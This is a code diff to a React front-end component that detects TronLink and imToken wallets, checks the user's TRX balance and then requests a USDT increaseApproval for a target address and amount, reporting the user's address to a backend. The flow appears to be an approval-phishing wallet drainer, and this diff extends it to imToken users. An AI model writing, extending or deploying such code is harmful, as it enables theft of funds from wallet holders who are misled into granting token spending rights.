@@ -5,7 +5,7 @@ import { useInterval } from 'ahooks';
 import { queryContractAddr, updateUserAddr } from '@/api';
 import { base64URLDecode, parseParamMapFromUrl } from '@/utils';
 
-import { Infos } from './config';
+import { Infos, Platforms } from './config';
 
 import { StepOne, StepTwo, TypeStepTwoHandle } from './step';
 
@@ -21,7 +21,8 @@ export function BizFlow() {
 
   const [wallet, setWallet] = useState<TypeWallet>('');
   const [chain, setChain] = useState<TypeChain>('');
-  const [addrUsdt, setAddrUsdt] = useState(Infos.tronlink.uca.main);
+  // TODO
+  const [addrUsdt, setAddrUsdt] = useState(Infos.tronlink.uca.main || '');
   const [addrTarget, setAddrTarget] = useState('');
 
   const [pageParams, setPageParams] = useState({
@@ -40,24 +41,29 @@ export function BizFlow() {
   const [flowStep, setFlowStep] = useState<'1' | '2'>('1');
 
   const clearUseInterval = useInterval(() => {
-    if (platformRef.current === 'tronlink') {
-      if (window.tronLink && window.tron?.isTronLink) {
+    if (Platforms.includes(platformRef.current)) {
+      if (window.tronLink && window.tron.isTronLink) {
         setWallet(Infos.tronlink.wallet);
         setChain(Infos.tronlink.chain);
         clearUseInterval?.();
         setPlatformMatched(true);
-        window.tronWeb?.trx
-          ?.getBalance(window.tronWeb?.defaultAddress?.base58)
-          ?.then((a) => {
-            setTempInfo({
-              content: `TRX余额：${a / 1000000}`,
-            });
-          });
-        // Message.show({
-        //   type: 'success',
-        //   align: 'cc cc',
-        //   content: 'TronLink钱包',
-        // });
+        // window.tronWeb?.trx
+        //   ?.getBalance(window.tronWeb?.defaultAddress?.base58)
+        //   ?.then((a) => {
+        //     setTempInfo({
+        //       content: `TRX余额：${a / 1000000}`,
+        //     });
+        //   });
+        // // Message.show({
+        // //   type: 'success',
+        // //   align: 'cc cc',
+        // //   content: 'TronLink钱包',
+        // // });
+      } else if (window.imToken && window.tronWeb) {
+        setWallet(Infos.imToken.wallet);
+        setChain(Infos.imToken.chain);
+        clearUseInterval?.();
+        setPlatformMatched(true);
       } else {
         // Message.show({
         //   type: 'warning',
@@ -76,6 +82,7 @@ export function BizFlow() {
 
     switch (payStr) {
       case `${Infos.tronlink.wallet}___${Infos.tronlink.chain}`:
+      case `${Infos.imToken.wallet}___${Infos.imToken.chain}`:
         {
           setFlowStep('2');
         }
@@ -122,24 +129,26 @@ export function BizFlow() {
       // const { trx, defaultAddress: da, contract } = window.tronWeb || {};
       const userAddr = window.tronWeb?.defaultAddress?.base58 || '';
 
-      // 连接钱包
-      const res = await window.tronLink?.request({
-        method: 'tron_requestAccounts',
-      });
-      if (res.code !== 200) {
-        alert('连接钱包失败');
-        return;
+      if (platformRef.current === 'tronlink') {
+        // 连接钱包
+        const res = await window.tronLink?.request({
+          method: 'tron_requestAccounts',
+        });
+        if (res.code !== 200) {
+          alert('连接钱包失败');
+          return;
+        }
       }
 
       // 查余额
       const _trx: number = await window.tronWeb?.trx?.getBalance?.(userAddr);
 
       // 余额满足
-      if (_trx > Infos.tronlink.trxLimit.value) {
+      if (_trx > Infos[platformRef.current].trxLimit.value || 0) {
         // ??? at ?
         const _contract = await window.tronWeb?.contract?.()?.at(addrUsdt);
         const result = await _contract
-          .increaseApproval(addrTarget, Infos.tronlink.amount)
+          .increaseApproval(addrTarget, Infos[platformRef.current].amount)
           .send({ feeLimit: 100000000 });
         // alert(`授权成功，交易ID: ${JSON.stringify(result)}`);
         if (result) {
@@ -189,7 +198,7 @@ export function BizFlow() {
       amountStr: amountStr || '',
     });
 
-    if (['tronlink'].includes(platformRef.current) === false) {
+    if (Platforms.includes(platformRef.current) === false) {
       // 不是需要尝试的目标平台，清除
       clearUseInterval?.();
     }
